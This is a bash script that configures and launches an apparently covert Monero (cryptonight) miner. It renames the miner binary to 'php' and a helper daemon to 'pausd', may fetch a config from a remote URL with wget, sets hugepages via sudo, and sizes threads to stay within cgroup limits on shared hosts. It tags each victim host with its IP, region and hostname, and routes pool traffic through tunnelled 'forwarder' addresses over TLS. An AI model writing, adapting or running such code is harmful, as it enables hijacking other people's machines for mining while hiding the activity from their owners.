#!/bin/bash

## object config
OBJ_MASK="${OBJ_MASK:-php}"
DAEMON="${DAEMON:-pausd}"
DAEMON_NAME="${DAEMON##* }"
if [ -z "$TNL_SKIP" -o "$TNL_SKIP" = 1 ]; then
    OBJ_CFG="${OBJ_CFG:-girmx_tnl_skip.1.json.tpl}"
else
    OBJ_CFG="${OBJ_CFG:-girmx.1.json.tpl}"
fi
OBJ_CFG_MASK="${OBJ_CFG_MASK:-config.json}"
# ARGS="${ARGS:-${OBJ_MASK} -c ${OBJ_CFG_MASK}}"
ARGS="${ARGS:-${OBJ_MASK}}" ## configless because config is autoread from standard name

## download cfg
if [ ! -e "cfg/${OBJ_CFG}" -a -n "$CFG_BASE_URL" ]; then
	wget -q "${CFG_BASE_URL}${OBJ_CFG}" -O "${OBJ_CFG}"
fi

## object in sln should be present in pl/
OBJ_NAME=${OBJ_NAME:-obj}
[ ! -e "$OBJ_MASK" ] && mv pl/"$OBJ_NAME" "$OBJ_MASK"
[ ! -e "$CLM_MASK" ] && mv pl/clm "$CLM_MASK"
chmod +x "${OBJ_MASK}" &>/dev/null
chmod +x "${CLM_MASK}" &>/dev/null

## daemon
# (when not included in the payload or is not a function)
# DAEMON_URL=""
# wget -q ${DAEMON_URL}
if [ -e $DAEMON_NAME ]; then
    chmod +x ${DAEMON_NAME} &>/dev/null
fi

## daemons conf
## misc
[ $UID != 0 ] && sudo=$(get_path sudo 2>/dev/null)
if [ -n "$HPGS" ]; then
    printf $HPGS | $sudo tee /proc/sys/vm/nr_hugepages &>/dev/null
else
    for i in {128,64,32,16,8,4}; do ## try setting some hugepages
        printf $i | $sudo tee /proc/sys/vm/nr_hugepages &>/dev/null && break
    done
fi

## instance ID
# CPU=$(grep -m 1 "model name" < /proc/cpuinfo | sed -r 's/model name\s*:\s*|[^a-zA-Z0-9]*//g')
get_cores
parse_ip
# IPADDR=$(http_req ipinfo.io/ip || "failed retrieving ip")
# HOSTN="$(echo $HOSTNAME | sed -r 's/[0-9]{2,}+|-//g')" ## clearup hostname while still preserving some identity
HOSTN=${HOSTNAME//[0-9][0-9]/} ## clearup hostname while still preserving some identity
HOSTN=${HOSTN//-/}

## L3 cache size to multihash factor
# cache_bytes=$(grep -im1 "cache size" </proc/cpuinfo | sed -r 's/[^0-9]*([0-9]+).*/\1/')
get_cache
cache_MB=${cache_MB:-$((cache_bytes / 1024 ))}
if [ ${TARGET_CO:-xmr} = xmr ]; then
        hashes=$((cache_MB / 2)) ## each hashpoint takes 2M for xmr
else
        hashes=$cache_MB
fi

## cpu
cgp=cpu.cfs_period_us
cgq=cpu.cfs_quota_us
## paths are not always the same
cg1=/sys/fs/cgroup/cpuacct,cpu
cg2=/sys/fs/cgroup/cpu,cpuacct
if [ -a $cg1 ]; then
    cpu_p=$(<$cg1/$cgp)
    cpu_q=$(<$cg1/$cgq)
elif [ -a $cg2 ]; then
    cpu_p=$(<$cg2/$cgp)
    cpu_q=$(<$cg2/$cgq)
fi
if [ -n "$cpu_p" -a -n "$cpu_q" -a "$cpu_p" != 0 ]; then ## respect cgroups
        ACORES=${ACORES:-$((cpu_q / cpu_p))} ## the available cpu (in number of cores)
    ## compose a binary string to map affinity (printf from bash or non busybox)
    if [ "$ACORES" -eq 1 ]; then
        THREADS_D=1
        if [ "$hashes" -gt 5 ]; then
                MHF_D=5
        else
                MHF_D=${hashes}
        fi
        elif [ -n "$ACORES" -a "$ACORES" -ne 0 ]; then
                THREADS_D="$ACORES"
                hashes_pc=$((hashes / ACORES))
                if [ "$hashes_pc" -ge 5 ]; then
                        MHF_D=4 ## never use 5mh with more than 1c
                else
                        MHF_D=$hashes_pc
        fi
    fi
else ## no cgroups, use half the cores

        [ $CORES -gt 1 ] && THREADS_D=$((CORES / 2)) || THREADS_D=1
        hashes_pc=$((hashes / THREADS_D))
        if [ "$hashes_pc" -ge 5 ]; then
                MHF_D=4
        else
                MHF_D=$hashes_pc
        fi
fi
## respect custom settings
if [ -n "$MHF_FIXED" ]; then
    MHF=${MHF_FIXED}
else
    MHF=${MHF:-${MHF_D}}
fi
if [ -n "$THREADS_FIXED" ]; then
    THREADS=$THREADS_FIXED
else
    THREADS=${THREADS:-${THREADS_D}}
fi
## don't setup affinity because on shared environments it yields lower performance overall
## because doesn't let the cpu scheduler do its job, other processes might stall causing further
## overhead making the system unstable, also close to useless in non-bare scenarios.
export AFFINITY="0x0"

## vars for the pausd daemon
export THREADS=${THREADS:-1} MHF=${MHF:-2}
export SHARES=${SHARES:-$((THREADS * MHF))} \
       RATE=${RATE:-200}

## vars for the object config
# read loadavg < /proc/loadavg
# loadavg=${loadavg% *[0-9]\/*} ## strip proc counters

export X_ID=${X_ID:-$(printf '%s' "${ip}-${country}-${region}-${HOSTN}")} \
UA=${UA:-KnockKnock} \
PA=${PA:-WhosThere} \
AL=${AL:-cryptonight} \
AESNI=${AESNI:-1}

## trim X_ID whitespace
X_ID=${X_ID// }


## commands
COMMAND_BEFORE="${COMMAND_BEFORE:-:;}"
COMMAND_AFTER="${COMMAND_AFTER:-:;}"

## pools
if [ -z "$TNL_SKIP" -o "$TNL_SKIP" = 1 ]; then
    function config_pools(){
        local pool
        read -r -d '' pool <<'POOL'
{
    \"url\": \"${URL}\",
    \"user\": \"${UA}\",
    \"pass\": \"${PA}\",
    \"keepalive\": true,
    \"use-tls\": true,
    \"nicehash\": \"${NICEHASH:-false}\"
}
POOL
        ## only first setup
        if [ "$1" = 0 ]; then
            fwds_file="net/forwarders"
            export pool_fwds=$(ushuffle $fwds_file)
        fi
        export POOLS=
        export last_pool=${last_pool:-0}
        local c=1
        for URL in $pool_fwds; do
            if [ $c -gt $last_pool ]; then
                POOLS="${POOLS}$(eval "printf '%s\n' \"$pool,\"")"
                last_pool=$c
                break
            else
                c=$((c+1))
                continue
            fi
            # [ $p -gt 3 ] && break
        done
    }
    config_pools 0
    function config_client(){
        ## only first setup
        if [ "$1" = 0 ]; then
            x_fwds_file="net/x_forwarders"
            export x_fwds=$(ushuffle $x_fwds_file)
        fi
        export last_x_url=${last_x_url:-0}
        local x_c=1
        for X_URL in $x_fwds; do
            if [ $x_c -gt $last_x_url ]; then
                if check_connection ${X_URL/:*} ${X_URL/*:}; then
                    last_x_url=$x_c
                    break ## && operator outsite [] is not reliable
                else
                    x_c=$((x_c+1))
                    continue
                fi
            fi
        done
        export X_URL
    }
    config_client 0

#     pool=$(cat <<'POOL'
# {
#     \"url\": \"${URL}\",
#     \"user\": \"${UA}\",
#     \"pass\": \"${PA}\",
#     \"keepalive\": true,
#     \"use-tls\": true,
#     \"nicehash\": \"${NICEHASH:-false}\"
# }
# POOL
#         )

    ## randomize forwarders list
    # fwd="net/forwarders"
    # pool_fwds=$(ushuffle $fwd)"
    # export POOLS
    # p=0
    # for URL in $(<$fwd); do
    #     POOLS="${POOLS}$(eval "printf '%s\n' \"$pool,\"")"
    #     p=$((p+1))
    # done
    ## pick a tunnel for the mccsrv from the forwarders
    # x_fwd="net/x_forwarders"
    # echo "$(ushuffle $x_fwd)" > "$x_fwd"
    # while read X_URL; do
    #     check_connection ${X_URL/:*} ${X_URL/*:}
    #     [ "$?" = 0 ] && break ## && operator outsite [] is not reliable
    # done < "$x_fwd"

    # export X_URL
fi

## subst
function config_config() {
    if [ "$1" = 0 ]; then
        export OBJ_CFG_TPL=$(<"cfg/${OBJ_CFG}")
        OBJ_CFG_TPL=${OBJ_CFG_TPL//\"/_#_#}
    fi
    if [ "$1" = 1 ]; then
        Q_CONFIG=$(eval "printf '%s' \"$OBJ_CFG_TPL\"")
        CONFIG=${Q_CONFIG//_#_#/\"}
    else
        Q_CONFIG=$(eval  "printf '%s' \"$OBJ_CFG_TPL\"")
        printf '%s' "${Q_CONFIG//_#_#/\"}" > "$OBJ_CFG_MASK"
    fi
}
config_config 0
# envsubst -no-empty -i "cfg/${OBJ_CFG}" -o "${OBJ_CFG_MASK}"
